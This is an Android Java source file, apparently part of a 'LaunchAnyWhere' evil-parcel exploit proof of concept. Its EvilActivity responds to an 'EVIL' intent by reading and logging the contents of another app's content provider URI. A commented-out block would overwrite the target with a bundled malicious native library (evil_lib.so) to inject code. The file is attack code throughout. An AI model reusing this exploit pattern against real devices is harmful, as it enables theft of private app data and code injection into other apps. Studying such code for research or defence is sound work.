package com.example.launchanywherebyevilparcel1999;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class EvilActivity extends Activity {

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handleIntent(getIntent());
    }

    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleIntent(intent);
    }
    private void handleIntent(Intent intent) {
        if("EVIL".equals(intent.getAction())) {
            try {
                Log.d("debug","Evil activity load");
                ContentResolver resolver = getContentResolver();
                InputStream in = resolver.openInputStream(intent.getData());
                Log.d("[*]content read", intent.getDataString());
                InputStreamReader isReader = new InputStreamReader(in);
                BufferedReader reader = new BufferedReader(isReader);
                StringBuffer sb = new StringBuffer();
                String str;
                while((str = reader.readLine())!= null){
                    sb.append(str);
                }
                Log.d("[*]content read:", String.valueOf(sb));
                /*
                OutputStream o = getContentResolver().openOutputStream(i.getData());
                InputStream in = getAssets().open("evil_lib.so");
                IOUtils.copy(in,o);
                in.close();
                o.close();
                */

            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
